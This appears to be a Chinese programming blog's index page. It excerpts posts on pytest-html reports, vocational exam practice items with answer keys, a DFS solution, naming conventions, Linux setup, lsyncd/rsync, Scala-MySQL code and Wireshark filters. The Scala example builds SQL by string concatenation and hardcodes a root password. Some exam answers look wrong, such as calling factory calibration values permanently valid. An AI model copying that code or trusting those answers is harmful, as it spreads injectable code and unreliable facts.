import pytest # 引入pytest包 def test_a(): # test开头的测试函数 print("-------&gt;test_a") assert (1) # 断言成功 def test_b(): print("-------&gt;test_b") assert (0) # 断言失败 if __name__ == '__main__': pytest.main(["--html=./report.html","test_demo1.py"]) 原因是没有安装pytest-html
pip install pytest-html
安装了后还是报错
解决办法：
进入File-Setting-Project Interpreter -点击+ 输入pytest-html 安装
再次运行，
打开report.html,以下就是测试报告
或者在命令窗口执行命令 ：pytest --html=report/report.html 也可以生成报告，要在工程的目录下执行命令
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8b9f6d996f4f7c39fd6d77859bd1269/" rel="bookmark">
			2020年车工（高级）免费试题及车工（高级）考试平台
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题库来源：安全生产模拟考试一点通公众号小程序
2020年车工（高级）免费试题及车工（高级）考试平台，包含车工（高级）免费试题答案和解析及车工（高级）考试平台练习。由安全生产模拟考试一点通公众号结合国家车工（高级）考试最新大纲及车工（高级）考试真题汇总，有助于车工（高级）模拟考试题考前练习。
1、【判断题】()切削用量包括进给量、背吃刀量和工件转速。（ × ）
2、【判断题】数控机床的伺服系统由驱动装置和执行机构两个部分组成。（ √ ）
3、【判断题】()在斜床身数控车床上加工外圆左旋螺纹，主轴反转，切削路线应从右向左时，螺纹刀面应朝下安装。（ × ）
4、【判断题】()刃磨刀具时，不能用力过大，以防打滑伤手。（ √ ）
5、【判断题】()黏度小的液压油工作压力小。（ √ ）
6、【判断题】()用刀宽4mm切槽刀执行程序段G75R1；G75X30Z-50P3000Q10000F0.1；其中Q10000为Z向移动间距10mm。（ √ ）
7、【判断题】车多线螺纹时，分线误差直接影响螺纹导程不等。（ × ）
8、【判断题】()采用复合螺纹加工指令车削加工螺距螺纹，螺纹的实际牙型角取决于刀尖角参数值（或切入角参数值）。（ × ）
9、【判断题】过盈配合的零件加工时表面粗糙度应该选小为好。（ √ ）
10、【判断题】按数控系统操作面板上的RESET键后就能消除报警信息。（ √ ）
11、【判断题】同轴度的基准轴线必须是单个圆柱面的轴线。（ × ）
12、【判断题】主轴的制造误差会引起主轴的回转运动误差。（ √ ）
13、【判断题】数控车床操作G代码可以分为模态G代码和非模态G代码。（ √ ）
14、【判断题】数控车床操作通常在命名或编程时，不论何种机床，都一律假定工件静止刀具移动。（ √ ）
15、【判断题】滚动轴承内圈与轴的配合，采用间隙配合。（ × ）
16、【判断题】单针与三针测量梯形外螺纹相比较，三针测量精度高。（ √ ）
17、【判断题】()除基本视图外，还有全剖视图、半剖视图和旋转视图三种视图。（ × ）
18、【判断题】()数控机床的程序保护开关的处于ON位置时，不能对程序进行编辑。（ √ ）
19、【判断题】()工件材料越硬，选用的砂轮硬度也要高。（ × ）
20、【判断题】车削精度高、导程不大的多线螺纹时，应把各条螺旋槽都粗车完毕后，再进行精车。（ × ）
21、【判断题】蜗杆的压力角与蜗轮的端面压力角相等。（ × ）
22、【判断题】专用偏心夹具不能对曲轴进行分度。（ × ）
23、【判断题】高速钢在强度、韧性等方面均优于硬质合金，故可用于高速切削。（ × ）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8b9f6d996f4f7c39fd6d77859bd1269/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98c8763dc897bd33d4521d3d7c6d61aa/" rel="bookmark">
			2020年机修钳工（技师）考试软件及机修钳工（技师）理论考试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题库来源：安全生产模拟考试一点通公众号小程序
2020年机修钳工（技师）考试软件及机修钳工（技师）理论考试，包含机修钳工（技师）考试软件答案和解析及机修钳工（技师）理论考试练习。由安全生产模拟考试一点通公众号结合国家机修钳工（技师）考试最新大纲及机修钳工（技师）考试真题汇总，有助于机修钳工（技师）在线考试考前练习。
1、【判断题】加工完的零件，其实际尺寸越接近于基本尺寸，合格的可能性越高。（ × ）
2、【判断题】自准直仪，可以用来测量反射镜对光轴垂直方向的微小移动。（ × ）
3、【判断题】钻削小孔时，应尽量选用较低的切削速度。（ × ）
4、【判断题】()精密零件测量的准确性就是机械加工最关键的技术问题。（ √ ）
5、【判断题】当磨头主轴和轴瓦因过度磨损（修磨量大于0.1mm）导致对主轴刚度、硬度， 油膜的承载能力等有严重影响时，应更换主轴和轴瓦。（ √ ）
6、【判断题】()定期检查是列入计划，每隔一定时间进行一次的检查。（ √ ）
7、【判断题】当系统中压力不足时，首先要检查压力表是否失灵，如失灵则要更换压力表。（ √ ）
8、【判断题】()按螺纹轮廓形状的不同，可分为单线螺纹和多线螺纹。（ × ）
9、【判断题】平均值读数法受温度的影响，因而较直接读数法的精度要低。（ × ）
10、【判断题】()随标准器具出厂的校正值可以永久用下去。（ √ ）
11、【判断题】()劳动争议仲裁委员会仲裁时，可以在收到仲裁裁决书之日起20日内向人民法院提起诉讼。（ × ）
12、【判断题】()影响某一装配精度的各有关尺寸所组成的尺寸组称为装配尺寸链。（ √ ）
13、【判断题】()在普通的螺旋传动中，由于螺杆与螺母的牙侧表面之间的相对运动摩擦是滑动摩擦，因此，传动阻力大，摩擦损失严重，效率低。（ √ ）
14、【判断题】()机床液压系统爬行现象，在轻微程度时为人眼不易觉察的振动，而显著时则为小距离的颤动。（ × ）
15、【判断题】()已挂警告牌的线路或设备，不准随意拆除。（ √ ）
16、【判断题】()若作用于物体同一平面上的三个不平行的力构成平衡力系，则它们的作用线必汇交于一点，这就是三力平衡汇交定理。（ √ ）
17、【判断题】刮削大型机床导轨面时，应在将导轨面上的零件全部拆除后进行，以保证刮削质量。（ × ）
18、【判断题】()溢流阀与顺序阀都是靠进口油压控制。（ √ ）
19、【判断题】精孔钻削应选用以冷却为主的切削液。（ × ）
20、【判断题】在刮削V型导轨与平面导轨副时，首先刮削平面导轨，再用刮好的平面导轨 作基准刮削V型导轨。（ × ）
21、【判断题】()T68卧式镗床主轴结构是二层结构。（ × ）
22、【判断题】()标准麻花钻的主切削刃长，且全宽参与切削，分屑、断屑、排屑困难。（ √ ）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98c8763dc897bd33d4521d3d7c6d61aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39d3cf14a0eee1703543c8ebe48c7318/" rel="bookmark">
			转：聊一聊-JAVA 泛型中的通配符 T，E，K，V，？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写的不错，收藏一下
https://juejin.im/post/6844903917835419661
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78baf88b1f9e04a7b535428b7be9cd1d/" rel="bookmark">
			[Acwing面向模型编程]dfs
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目1：AcWing 1118. 分成互质组 分析： 枚举每个数，他既可以放到当前已经有的箱子里，也可以新开一个箱子。
代码： #include &lt;bits/stdc++.h&gt; using namespace std; typedef long long ll;//三年竞赛一场空，不开long long见祖宗 //typedef __int128 lll; #define print(i) cout &lt;&lt; "debug: " &lt;&lt; i &lt;&lt; endsl #define close() ios::sync_with_stdio(0), cin.tie(0), cout.tie(0) #define mem(a, b) memset(a, b, sizeof(a)) #define pb(a) push_back(a) #define x first #define y second typedef pair&lt;int, int&gt; pii; const ll mod = 1e9 + 7; const int maxn = 1e5 + 10; const int inf = 0x3f3f3f3f; int n; int a[20]; int group[20][20], cnt[20]; int ans = 10; bool judge(int now, int val) { for(int i = 1; i &lt;= cnt[now]; i++) if(__gcd(group[now][i], val) &gt; 1) return false; return true; } void dfs(int id, int num) { if(num &gt;= ans) return; if(id == n + 1) { ans = min(ans, num); return; } for(int i = 1; i &lt;= num; i++) { if(judge(i, a[id])) { group[i][++cnt[i]] = a[id]; dfs(id + 1, num); cnt[i]--; } } cnt[num + 1] = 1; group[num + 1][cnt[num + 1]] = a[id]; dfs(id + 1, num + 1); cnt[num + 1] = 0; } int main() { cin &gt;&gt; n; for(int i = 1; i &lt;= n; i++) cin &gt;&gt; a[i]; dfs(1, 0); cout &lt;&lt; ans &lt;&lt; endl; } 题目2：165.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78baf88b1f9e04a7b535428b7be9cd1d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db0b50ead524eb95094fdeb76431009f/" rel="bookmark">
			Java变量使用练习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 public class Class{ public static void main(String[] args){ int intNumber1 = 100; String stringName1 = "张三"; char charSex1 = '男'; double doubleHeight1 = 1.85; System.out.println("学号："+intNumber1); System.out.println("姓名："+stringName1); System.out.println("性别："+charSex1); System.out.println("身高："+doubleHeight1); int intNumber2 = 120; String stringName2 = "李四"; String stringSex2 = "女"; double doubleHeight2 = 1.65; System.out.println("学号："+intNumber2); System.out.println("姓名："+stringName2); System.out.println("性别："+stringSex2); System.out.println("身高："+doubleHeight2); }	} 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ac20acf23368f545df075127ca3a8a1/" rel="bookmark">
			编程变量命名规则及编程单词缩写字典
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作为一个程序猿，在编程过程中不可避免的要对变量命名，这个时候就需要掌握几种常见的命名规则，及常用单词的缩写，故从网上整理了一篇资料，以飨读者！(✿◡‿◡) O(∩_∩)O哈！
命名规则：
目前，业界共有四种命名法则：驼峰命名法、匈牙利命名法、帕斯卡命名法和下划线命名法，其中前三种是较为流行的命名法。
(1)驼峰命令法。正如它的名称所表示的那样，是指混合使用大小写字母来构成变量和函数的名字。例如，下面是分别用骆驼式命名法和下划线法命名的同一个函数： printEmployeePaychecks()； print_employee_paychecks()； 第一个函数名使用了驼峰命名法，函数名中的每一个逻辑断点都有一个大写字母来标记。第二个函数名使用了下划线法，函数名中的每一个逻辑断点都有一个下划线来标记。 驼峰命名法近年来越来越流行了，在许多新的函数库和Microsoft Windows这样的环境中，它使用得当相多。另一方面，下划线法是C出现后开始流行起来的，在许多旧的程序和UNIX这样的环境中，它的使用非常普遍。
(2)匈牙利命名法。广泛应用于象Microsoft Windows这样的环境中。Windows 编程中用到的变量(还包括宏)的命名规则为匈牙利命名法，这种命名技术是由一位能干的 Microsoft 程序员查尔斯-西蒙尼(Charles Simonyi) 提出的。 匈牙利命名法通过在变量名前面加上相应的小写字母的符号标识作为前缀，标识出变量的作用域、类型等。这些符号可以多个同时使用，顺序是先m_(成员变量)、再指针、再简单数据类型、再其它。这样做的好处在于能增加程序的可读性，便于对程序的理解和维护。 例如：m_lpszStr, 表示指向一个以0字符结尾的字符串的长指针成员变量。 匈牙利命名法关键是：标识符的名字以一个或者多个小写字母开头作为前缀；前缀之后的是首字母大写的一个单词或多个单词组合，该单词要指明变量的用途。
(3)帕斯卡(pascal)命名法。与驼峰命名法类似，二者的区别在于：驼峰命名法是首字母小写，而帕斯卡命名法是首字母大写，如： DisplayInfo(); string UserName; 二者都是采用了帕斯卡命名法。
(4)三种命名规则的小结：MyData就是一个帕斯卡命名的示例；myData是一个驼峰命名法,它第一个单词的第一个字母小写,后面的单词首字母大写,看起来像一个骆驼；iMyData是一个匈牙利命名法,它的小写的i说明了它的型态，后面的和帕斯卡命名相同，指示了该变量的用途。
命名的基本原则 (1) 标识符的命名要清晰、明了，有明确含义，同时使用完整的单词或大家基本可以理解的缩写，避免使人产生误解——尽量采用采用英文单词或全部中文全拼表示，若出现英文单词和中文混合定义时，使用连字符“_”将英文与中文割开。较短的单词可通过去掉“元音”形成缩写；较长的单词可取单词的头几个字母形成缩写；一些单词有大家公认的缩写。例如：temp-&gt;tmp、flag-&gt;flg、statistic-&gt;stat、increment-&gt;inc、message-&gt;msg等缩写能够被大家基本认可。
(2)命名中若使用特殊约定或缩写，则要有注释说明。应该在源文件的开始之处，对文件中所使用的缩写或约定，特别是特殊的缩写，进行必要的注释说明。
(3)命名规范必须与所使用的系统风格保持一致，并在同一项目中统一。
(4)对于变量命名，禁止取单个字符(如i 、j 、k... )，建议除了要有具体含义外，还能表明其变量类型、数据类型等，但i 、j 、k 作局部循环变量是允许的。变量，尤其是局部变量，如果用单个字符表示，很容易敲错(如i写成j)，而编译时又检查不出来，有可能为了这个小小的错误而花费大量的查错时间。
编程单词缩写规则： 1、大于2个单词则采用缩写规则，否则不用缩写。
2、缩写的规则采用国际惯用方法：
元音字母剔除法，首字母除外。
使用单词的头一个或几个字母。 组合单词使用如下规则： 3、使用变量名中每个有典型意义的单词。如Count of Failure写成FailCnt。 4、去掉无用的单词后缀 ing, ed等。如Paging Request写成PagReq。
编程单词缩写字典
序号
描述
缩写词
A
Addition
Add‍
Accumulator
Acc
Address
Addr
Action
Act
Active
Act
Amplitude
Amp
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ac20acf23368f545df075127ca3a8a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4073c027e3cd8a8463f6b5b0a97961d/" rel="bookmark">
			ubuntu/deepin准备java开发环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用 apt 安装 # 安装git sudo apt install git # 安装jdk11 sudo apt install openjdk-11-jdk # 安装maven sudo apt install maven # 安装文本编辑器 sudo apt install sublime-text3 下载安装 下载vscode安装 https://code.visualstudio.com/
下载idea安装 https://www.jetbrains.com/idea/
下载谷歌浏览器安装 https://www.chromedownloads.net/chrome64linux/
下载Postman安装 https://learning.postman.com/docs/getting-started/installation-and-updates/#installing-postman-on-linux
添加apt源安装 nodejs https://github.com/nodesource/distributions#deb
dbeaver安装 https://dbeaver.io/download/
wget -O - https://dbeaver.io/debs/dbeaver.gpg.key | sudo apt-key add - echo "deb https://dbeaver.io/debs/dbeaver-ce /" | sudo tee /etc/apt/sources.list.d/dbeaver.list sudo apt-get update &amp;&amp; sudo apt-get install dbeaver-ce typora
wget -qO - https://typora.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d4073c027e3cd8a8463f6b5b0a97961d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a8998e5d9801d91daf0672260cbdd5f/" rel="bookmark">
			CentOS7部署lsyncd&#43;rsync实现服务器文件实时同步
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章z转自：https://blog.51cto.com/qiangsh/2459022
Lsyncd是什么？
Github：axkibe/lsyncd
官方文档：Lsyncd – Live Syncing (Mirror) Daemon
Lysncd即Live Syncing Daemon，它是开源的数据实时同步工具(后台进程)，基于inotify和rsync。
Lsyncd是一个辅助文件同步工具。它通过监听系统的文件变化事件，调用rsync进行同步。注意“辅助”二字，辅助的意思是：同步文件本身并不是由lsyncd来实现，它只负责监测哪些文件改变了，进而调用rsync来完成同步，真正同步文件的是rsync，如果你不知道什么是rsync，请查看使用sersync +rsync进行实时文件同步中的rsync部分。
Lsyncd的三种同步模式
default.rsyncdefault.rsyncsshdefault.direct 为了方便，我们直接把它们称为rsync、rsyncssh、direct。
1. rsync同步模式 首先，你需要知道rsync的基本用法，以下的rsync命令就可以把文件从本地的“/data/wwwroot”目录推送到远程的“remote@192.168.1.6::wwwroot/”目录中，运行在“rsync同步模式”的lsyncd正是通过组装类似这样的命令来同步文件的：
rsync -avz --partial --delete /data/wwwroot remote@192.168.1.6::wwwroot/ --password-file=/etc/rsyncd.password 有人可能会疑惑，既然rsync本身就可以同步，那要lsyncd干嘛？有两个原因： 实时同步。 减少rsync扫描文件带来的延时和性能损耗。 rsync无法知道“什么时候同步”，因为rsync只有执行同步命令的时候，才会去扫描文件判断哪些文件被修改了，只能建立一个定时任务，每隔一定的时间（比如5分钟，10分钟等等）去执行一次同步，这样虽然能同步，但却“不实时”。lsyncd就可以监听文件的修改，换句话说，某个文件修改了，lsyncd会得到通知(原理是使用linux系统的inotify/fsevents功能)，得到通知之后，再去调用rsync把修改的文件进行同步(即组装一句rsync同步语句并执行)，达到“实时同步”的效果。
-lsyncd调用rsync同步命令的时候，会用rsync的–include-from=FILE之类的选项来指定要同步哪些文件，这样可以达到“减少rsync扫描文件带来的延时和性能损耗”。为什么这么说呢？因为如果让rsync自己去查询哪些文件改变了，需要消耗较多的时间和服务器资源，试想一下，在100万个文件中，有一个文件添加了一个英文的句号.，如果没有lsyncd告诉rsync改变的是这个文件，那rsync就要去扫描100万个文件来找出这个仅仅多了一个.的文件，虽然rsync的查找效率很高，但这个查找是非常没有必要的，这就是为什么lsyncd能“减少rsync扫描文件带来的延时和性能损耗”。 2. rsyncssh同步模式 明白了rsync同步模式，就不难明白rsyncssh模式，因为rsync本身就是有ssh模式的，lsyncd同样是负责监听哪些文件变化了，然后组装rsync同步命令进行同步。
rsync的ssh模式，主要的好处是用于文件移动的时候
1.假设我现在有两台机A和B，A中的test目录文件变化会自动同步到B中的test目录，现在A、B的test目录文件如下：
├── dir1 │ ├── aa.txt │ ├── bb.txt │ └── cc.txt └── dir2 └── dd.txt 2.假设现在把A机的bb.txt和cc.txt从dir1移动到dir2，即变成如下所示的状态：
├── dir1 │ └── aa.txt └── dir2 ├── bb.txt ├── cc.txt └── dd.txt 假设使用普通的rsync模式，那么rsync会先删除B机中的dir1中的bb.txt和cc.txt，并把A机中的bb.txt和cc.txt文件上传到B机中的dir2目录，达到同步的效果。但如果你rsync运行在ssh模式，那么它会直接在B机中把dir1中的bb.txt和cc.txt用mv命令直接移动到dir2目录，A机没有向B机传任何数据，效率显而易见(特别是移动的数据特别多的时候更明显)。这样看，rsyncssh模式应该是最好的，但它却有一个缺点，就是同步进程只能是单进程(maxProcesses=1)，而rsync模式是可以多进程同步的(速度快)。 3. direct同步模式 这个模式用于本地的两个目录之间同步，不用于远程服务器同步。lsyncd同样是监听文件变化事件，然后把变化的文件从源目录同步到目标目录，同步的命令，就是linux系统本身的命令，比如cp、rm、mv，增加了文件用cp拷过去，删除了文件，那边也用rm删除，移动了文件，那边也用mv移动。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a8998e5d9801d91daf0672260cbdd5f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e35f5aeff68577677edb402e5308d70/" rel="bookmark">
			Scala连接mysql的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Scala连接mysql的方法 1、先用MySQL建表、插数据2、idea加载驱动包3、scala代码 1、先用MySQL建表、插数据 CREATE TABLE student( id INT(10) PRIMARY KEY AUTO_INCREMENT, NAME VARCHAR(32), age INT(10) ) INSERT INTO student(NAME,age) VALUES("zs",18),("ls",21) 2、idea加载驱动包 驱动包下载链接: https://pan.baidu.com/s/1aCQ6wfjS5ux_JHyBaGTFlA 提取码: hxrm 找到下载的驱动包 确认
3、scala代码 import java.sql.{Connection, DriverManager, PreparedStatement, ResultSet} object MysqlDemo{ private val driver="com.mysql.jdbc.Driver" //驱动 private val url="jdbc:mysql://192.168.116.60:3306/scalademo" //自己的ip地址:端口号/库名 private val username="root" //用户名 private val password="ok" //密码 private var connection:Connection=null //加载驱动 def getConnection():Unit={ Class.forName(driver) connection= DriverManager.getConnection(url,username,password) } //插入语句 def insert(uname:String,uage:Int):Int={ val insertSqlString="insert into student(name,age) values(\""+uname+"\","+uage+")" val i:Int=connection.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e35f5aeff68577677edb402e5308d70/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ea181dd6d1bca874cc6a349471f3ddf/" rel="bookmark">
			超详细解析wireshark捕获过滤器语法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里写目录标题 使用捕获过滤器指定捕获过滤器基于类型过滤基于传输方向的过滤基于协议过滤基于数据过滤使用多个捕获过滤器使用预置表达式 使用捕获过滤器 指定捕获过滤器 捕获过滤器的语法格式为：
&lt;Protocol&gt; &lt;Direction&gt; &lt;Host&gt; &lt;Value&gt; &lt;Logical Operation&gt; &lt;other expression&gt;
以上语法解析：
● Protocol (协议) :该选项用来指定协议。可使用的值有ether、fddi、 wlan、 ip、arprarp、decnet、 lat、 sca、 moproc、 mopdl、 tcp 和udp.如果没有特别指明是什么
议，则默认使用所有支持的协议。
●Direction (方向) :该选项用来指定来源或目的地，默认使用src or dst作为关键该选项可使用的值有src、dst、 sre and dst和src or dst。
●Host(s): 指定主机地址。如果没有指定，默认使用host 关键字。可能使用的值有
net、port、 host 和portrange.
●Logical Operations (逻辑运算):该选项用来指定逻辑运算符。可能使用的值有and和or.其中，not (否)具有最高的优先级; or (或)和and (与)具有
优先级，运算时从左至右进行。
●Other expression (其他表达式) :使用其他表达式捕获过滤器。
例如：
指定捕获tcp协议且端口为80 的数据包：
基于类型过滤 Wireshark可以基于类型进行捕获过滤。其中可能使用的类型有主机host，网段net，端口port，端口范围portrange和特殊类型。
主机host 语法格式： host host
解析：第一个host表示过滤器类型为host：第二个host表示主机地址，可以是ipv4或Ipv6地址。 例：捕获主机192.168.1.10 的数据包。
host 192.168.1.10
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4ea181dd6d1bca874cc6a349471f3ddf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1b5b7522baa0ae8e19f0713b5787646/" rel="bookmark">
			软件测试和软件开发哪个发展更好
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		经常有想转IT行业的同学，在了解软件测试和软件开发之后不知道转那个岗位好，今天就系统的，从多个维度来比较软件测试与软件开发，具体包括从基本素质要求、性格要求、入职门槛、知识结构、竞争压力、职业发展、职业前景等。希望能给在选择软件测试与开发朋友一个相对全面的解答。
一、【基本素质要求】 这里的基本素质包括比如逻辑思维能力、分析问题能力、沟通能力、协作能力、怀疑精神等方面。
【软件测试】： 作为一名优秀的测试工程师，需要比较强的综合素质，具体包括比如“五心”，责任心、细心、耐心、专心、信心等，具体这里不阐述了，可以看我以前的相关文章；五大“学问”，
逻辑学，很多公司在招聘的过程中会刻意来考察下测试工程师的逻辑思维能力。
刑侦学，测试工程师需要通过分析问题的表象，借助专业的工具，良好的知识背景来分析问题背后深层次的根本原因。
心理学，测试工程师，需要不仅仅站在用户的角度来测试，也需要清楚开发人员的心理，分析他们的出错模式。
统计学，测试报告就是统计学知识很好的展现。
经济学，好的测试一定是为了帮助提高软件质量，从而提高用户满意度，带来更多的市场，从而实现盈利。
沟通能力体现在测试工程师需要跟开发人员和用户沟通。协作和怀疑精神对于测试工程师而言也是非常重要的素质。
【软件开发】： 需要说明一点的是，这里指的软件开发更多倾向于软件编码，不包含软件设计以及软件需求分析人员，这个是软件编码未来的职业方向。作为一名优秀的开发工程师，在素质方面，更偏向于某一个方面，对逻辑思维能力的要求相对测试工程师较低一点。因为在成熟的开发模式下，普通的编码人员更多地师掌握一门开发语言的语法和一个开发平台。所以在印度高中生都能编程，但是在中国行不通。从这个方面来看，对“五心”的要求和对“五大学问”的要求没有那么全面。如果说测试更强调综合素质，那么开发更看重某些方面的素质。
二、【性格要求】 有人说性格决定命运，从某种意义上来说也是对的，性格会在一定程度上决定一个人的兴趣，一个人会喜欢那种类型的工作。
【软件测试】： 从全面性的角度来看，作为一名优秀的测试工程师，性格上最好是相对外向点，虽然这个不代表你需要像销售人员那样外向，善于与人交流。但起码你要愿意主动与开发人员，与用户沟通。另外，对于性格而言，要求测试工程师更加敏感，更具备怀疑精神，挑剔的，追求完美的性格以及刨根问底的心态也是比较重要的。从沟通的角度来看，太过于内向的人不太合适软件测试这个行业，起码不适合一线的测试工程师。
【软件开发】： 开发工程师对于性格来说，要求没有那么明显，性格的内向、外向跟成为一名优秀的开发工程师关系不大。因为开发工程师更多的是面对开发环境，不断在修改代码？这里面也有不少工作是重复繁琐的。所以性格上要求是能承受寂寞的。所以写代码写的比较久的人，有时会觉的很急躁。改变这种急躁的办法有两个，一个是争取去做有思想的设计，有沟通的需求分析。另一个是转型，比如做开发管理、产品经理、项目管理，亦或者是测试开发。
三、【入职门槛】 这个部分是为想进入软件测试和软件开发领域的人而专门写的。网络上很多人都在说，软件测试入职门槛低，软件开发入职门槛高。其实这个观点有失偏颇。下面具体来比较。
【软件测试】： 客观上来讲，进入软件测试领域的方式更多，但不是入职门槛更低，比如有些人可以通过行业知识背景进入软件测试领域，具体比如金蝶、用友都有不少测试工程师是学财务的，而不一定是学计算机的。甚至有些人可以通过性格和基本素质进入软件测试领域，比如微软以前招过家庭主妇做软件测试。不是微软不重视测试，实际上微软比任何软件企业更重视软件测试，在微软所有产品里面，测试工程师比例比开发是要高的。还有些是从软件开发工程师转型做软件测试，所以进入软件测试领域的方式很多。正是因为方式多，就给人造成一种迹象是入职门槛低。还有从现状的角度来看，因为需求的因素，企业不经意间降低了对软件测试工程师的要求，但是这个是饮鸩止渴。很多企业慢慢发现了这个问题，所以说，以后测试工程师的要求会越来越高。
【软件开发】： 客观上来讲，进入软件开发领域方式相对较少，但也不是入职门槛更高，因为，在印度高中生都能编程。实际上掌握一门开发语言的语法，掌握一个开发平台，就可以做编码了。尤其在成熟的开发企业如此。但从学历的角度来看，高中生要想做软件测试还是非常困难的。只是因为，开发工程师必须要学一门编程语言，所以表面上看起来要求更高，还有一个因素是受传统因素的影响，做软件开发的人相比软件测试的人多很多，所以从竞争压力上来看，要求就更高了，是比较出来的高。
四、【转行难度】 转行，其实最重要的原因不外乎就是以下几点：对现在的薪酬不满意、现在的职业出现了瓶颈、新的行业有更大的发展空间，喜欢新的工作方式等。这里就不讨论转行的动机，这里考虑更多的是转行的障碍，主要的障碍有，如何结合自身实际情况选择转行的方向？如何克服工作经验不足或不相关？如何克服专业知识匮乏？什么样的年龄适合？这部分是为转行做软件开发还是软件测试的人专门写的。网络上也有人不少人都在说，我之所以转行来做软件测试，是因为入职门槛低，前景好，是因为学得会，而软件开发我学不会。真的是这样吗？不一定。适合的才是最好的。
【软件测试】： 自身的实际情况，包括前面讲的基本素质、性格特点等，以及入职门槛因素，如果综合素质很全面、性格外向、沟通能力强，有不错的行业知识背景。比如有金融背景、财务背景、物流行业背景、证券背景、电子商务背景、移动通信背景等等。同时年龄在35岁以下，转行测试会比较合适。经过专业知识学习，结合行业分析加上有经验的人得指导。转行的难度还是比较小的。可行性还是比较高的。因为可以利用好自身的过去的一些东西。
【软件开发】： 转行开发的角度来看，很难只靠基本素质和性格特点就轻易地转行，这个难度比较大，从过去的知识背景的角度来看，转行开发比较难以利用上。所以过去的经历对于转行开发几乎没有帮助，从这点来看，要转行开发，就必须接受从零开始，所以，年龄超过25岁，有过两年以及以上工作经验的人，不太合适转行开发。因为要浪费两年的工作经历。
五、【知识结构】 知识结构决定职业发展，知识结构决定行业发展，包括未来职业规划的考虑，下面从一个优秀的测试工程师应该具备的知识结构来对比软件测试与软件开发。
【软件测试】： 一个优秀的测试工程师需要的知识结构，从全面性角度来看，包括如下几个方面，第一是计算机知识，包括编程语言，掌握至少一门开发语言，比如c、java、C#等，一门脚本语言，比如Tcl、python、Perl、Ruby、Shell中对于测试工程师未来更广的职业发展非常有帮助。数据库知识，虽然并不是所有的测试工程师都需要掌握一门数据库，比如做移动互联网的，对数据库要求相对较低，但对于大部分大型项目，都会有数据库，所以掌握至少一门数据库，比如Oracle、DB2、Mysql等。另外操作系统，比如Linux、Unix核心命令也非常重要。对于有些涉及到网络的，网络和通信知识，比如Tcp/IP协议也非常重要。另外数据结构、软件工程等其他计算机知识也最好也具备。第二部分是软件测试核心技术，掌握软件测试核心的方法论，具体包括软件测试需求分析与软件测试用例设计核心工程方法。掌握主流的软件测试工具，比如性能测试工具LoadRunner，自动化工具典型代表QTP，测试管理工具QC、开源测试管理工具Testlink、Bugzilla、Bugfree、Jira等。掌握核心的研发流程，比如RUP，测试流程，比如双V模型，或者是现在流行的敏捷测试等，也是同样重要。方法是秘笈、工具是兵器、流程是套路。虽然测试好比武术，棍术好比黑盒测试，剑术好比白盒测试。不同的武术对知识结构要求是不一样。这个也是前面讲到的进入软件测试领域的方式相比开发要多的原因之一。第三个部分是行业知识与背景，这个对于有些行业而言，非计算机专业的人会有些相对的优势。
【软件开发】： 一个优秀的软件开发工程师需要的知识结构，从全面性角度来看，包括如下几个方面，第一也是最重要的是精通至少一门编程语言语法，比如Java、C、C++、C#等，至少熟悉一个开发平台或工具，跟具体开发语言对应的平台，比如Eclipse、Netbeans、VC等。熟悉一门数据库，比如Oracle、DB2、Mysql等，熟悉操作系统，比如Linux、Unix包括相关的编译环境，比如gcc等。熟悉软件工程、熟悉算法、数据结构。这个方面可以多看看，设计模式方面的书籍。第二部分是英语，英语对于做好软件开发也有非常大的帮助，因为开发平台和环境都是英文为主。英语也有助于帮助理解一个编程语言的语法。
六、【竞争压力】 竞争压力的分析有助于帮助我们选择，选择大于努力指的是，同样花5年的时间，所能达到的不同的程度。竞争压力的大小取决于行业发展现状。行业越成熟，竞争压力越大。
